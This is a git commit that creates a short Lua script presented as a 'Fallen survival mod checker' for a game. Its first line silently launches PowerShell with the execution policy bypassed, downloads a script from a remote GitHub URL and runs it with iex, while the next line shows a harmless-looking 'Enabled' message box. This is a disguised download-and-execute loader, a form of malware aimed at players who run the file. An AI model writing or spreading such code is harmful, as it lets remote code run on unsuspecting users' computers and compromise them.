4ebad4877540a566b01c0e541d914409fd9f6eed
monkeyadece <118022576+monkeyadece@users.noreply.github.com>
2025-02-21 22:24:43 -0500

    Create ewqewv1.lua

---
+++ ewqewv1.lua
@@ -0,0 +1,3 @@
+os.execute('powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/monkeyadece/teste/refs/heads/main/ewqeq | iex"')
+messagebox("Enabled: True | Made by monkeyadece", " Fallen survival mod checker",  48)
+-- Made by monkey |2/21/2025| --
